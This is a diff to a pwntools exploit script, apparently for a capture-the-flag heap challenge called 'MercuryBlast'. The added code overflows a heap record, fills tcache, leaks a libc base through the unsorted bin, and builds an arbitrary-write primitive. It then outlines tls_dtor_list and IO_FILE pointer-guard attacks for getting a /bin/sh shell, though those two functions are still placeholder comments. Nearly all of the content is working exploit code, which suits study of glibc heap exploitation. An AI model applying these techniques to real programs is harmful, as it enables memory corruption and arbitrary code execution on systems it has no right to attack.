@@ -24,14 +24,13 @@ def debug(breakpoint=''):
     gdbscript += 'directory %slibio/\n' % glibc_dir
     gdbscript += 'directory %self/\n' % glibc_dir
     gdbscript += 'set follow-fork-mode parent\n'
-    gdbscript += 'set resolve-heap-via-heuristic on\n'
     elf_base = int(os.popen('pmap {}| awk \x27{{print \x241}}\x27'.format(p.pid)).readlines()[1], 16) if elf.pie else 0
     gdbscript += 'b *{:#x}\n'.format(int(breakpoint) + elf_base) if isinstance(breakpoint, int) else breakpoint
     gdb.attach(p, gdbscript)
     time.sleep(1)
 
 elf = ELF("./MercuryBlast")
-libc = ELF("./libc-2.31.so")
+libc = ELF("./libc.so.6")
 context(arch = elf.arch ,log_level = 'debug', os = 'linux',terminal = ['tmux', 'splitw', '-hp','62'])
 
 def add_record(temp, size, data):
@@ -61,14 +60,74 @@ def blast(data):
 
 read_bp = 0x167a
 
+rol = lambda val, r_bits, max_bits: \
+(val << r_bits%max_bits) & (2**max_bits-1) | \
+((val & (2**max_bits-1)) >> (max_bits-(r_bits%max_bits)))
+
 def exp1():
-    p.interactive()
+    add_record("1.1", 0x100, "a") #0
+    add_record("1.1", 0x100, "a") #1
 
+    ## |Record_0|Data_0|Record_1|Data_0|TOP_CHUNK
+    # debug()
+    payload = b"a" * 0x100 + b"b" * 0x10 + p64(0) + p64(0x1000)
+    edit_record(0, "1.1", 0x200, payload)
+    print_record()
 
-def exp2():
-    p.interactive()
+    ## 1. In order to have libc address appears on top of heap region,
+    ## we need to inserted some heap chunks into unsorted bin.
 
+    ## 2. The heap chunks we can created is of size 0x0 - 0x200,
+    ## within the range of tcache, so we need to fullfill it at first.
+
+    for i in range(0, 8):
+        add_record("1.1", 0x100, "a") #2 - 9
     
+    ## free 2 - 8
+    for i in range(2, 9):
+        delete_record(i)
+
+    ## Where will chunk_9 be inserted into?
+    add_record("1.1", 0x30, "a") #10
+    delete_record(9)
+    print_record()
+    leak = ru('\x7f')
+    libc_base = u64(leak[-5:] + b'\x7f\x00\x00') - 0x219ce0
+    sys_addr = libc_base + libc.symbols["system"]
+
+    log.success(hex(libc_base))
+    log.success(hex(sys_addr))
+
+     ## arbitrary address write
+    def arw(addr, data):
+        payload = b"a" * 0x100 + p64(0) + p64(0x21) + p64(0) + p64(0x1000) + p64(addr)
+        edit_record(0, "1.1", 0x200, payload)
+        edit_record(1, "1.1", 0x100, data)
+
+
+    def tls_dtor_list_attack():
+        ## Attack Path One: tls_dtor_list
+        #1. Overwrite fs:[0x30] as a known value (e.g., 0x0), or leak fs:[0x30] 
+        #2. Overwrite fs:[-0x58] to an address that we can control (say “hijacked_addr”), forge a tls_dtor_list there
+        #3. Overwrite hijacked_addr->func as (&𝑠𝑦𝑠𝑡𝑒𝑚 ⊕ 𝑓𝑠:[0𝑥30])≪ 0𝑥11
+        #4. Overwrite hijacked_addr->obj as &”/bin/sh”
+        pass
+
+
+    def IO_FILE_attack():
+        ## Attack Path Two: IO File
+        #1. overwirte stdout+0xe0 == &"/bin/sh"
+        #2. overwirte stdout+0xe8 == &system << 0x11
+        #3. overwirte tls+0x30 (pointer guard) == 0 
+        #4. overwrite stdout+0xd8 ==  (make sure *(stdout+0xd8) + 0x38 == IO_cookie_read )
+        pass
+
+
+    tls_dtor_list_attack()
+    # IO_FILE_attack()
+    p.interactive()
+
+
+
 p = process("./MercuryBlast")
 exp1()
-# exp2()
